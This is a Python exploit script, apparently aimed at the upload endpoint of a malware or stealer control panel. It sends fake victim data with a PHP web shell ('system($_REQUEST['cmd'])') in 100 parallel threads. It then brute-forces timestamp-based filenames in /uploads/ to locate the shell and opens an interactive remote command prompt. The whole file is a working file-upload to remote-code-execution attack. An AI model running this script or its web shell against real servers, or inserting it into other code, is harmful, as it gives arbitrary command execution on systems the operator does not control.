import requests
import threading
import time
import sys

def upload(host):

  url = f"{host}/result.php?GUID=bla&RT=bla2&ID=fakeid&Continue=2"

  data = {"Nick" : "nickname", "OS" : "windows", "Comp" : "Compyoyo", "User" :"fakeuser", "CPU" : "CPU123", "GPU" : "GGPU1", "Anti" : "av1", "Def" : "Defender", "Inf" :"infa12", "GUID" : "fakeguid", "RT" : 2, "ID" : "fakeid", "Continue":2}


  files = { "File" : ( "x.php" , b"<?php system($_REQUEST['cmd']); ?>") }

  r = requests.post(url, data=data,files=files, verify=False)


tValue = 0
shellUrl = None
theLock = threading.Lock()


def finder(host):
  global tValue
  global shellUrl
  global theLock

  while shellUrl is None:
    try:
      url = f"{host}/uploads/{tValue}_x.php"
      r = requests.get(url)
      if r.status_code == 200:
        shellUrl = url
    except:
      pass
    finally:
      theLock.acquire()
      tValue += 1
      theLock.release()


def execCmd(url, cmd="id"):
  data = {"cmd" : cmd}
  r = requests.post(url, data=data)
  return r.text


def main():
  if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <host>")
    print(f"Example: {sys.argv[0]} https://evilhost.com")
    sys.exit(1)

  global tValue
  global shellUrl

  print("[*] Uploading files ...")
  # start uploading
  for i in range(100):
    t = threading.Thread(target=upload, args=(sys.argv[1],))
    t.start()
  
  tValue = int(time.time()*1000)
  finderThreads = []

  # start trying to find one of the shells
  print("[*] Searching for our shell ...")
  for i in range(30):
    t = threading.Thread(target=finder, args=(sys.argv[1],))
    t.start()
    finderThreads.append(t)

  while shellUrl is None:
    time.sleep(1)

    
  print(f"[+] Found shell @ {shellUrl}\n")
  print(execCmd(shellUrl))

  while 1:
    cmd = input("> ")
    print(execCmd(shellUrl, cmd))


if __name__ == '__main__':
  main()
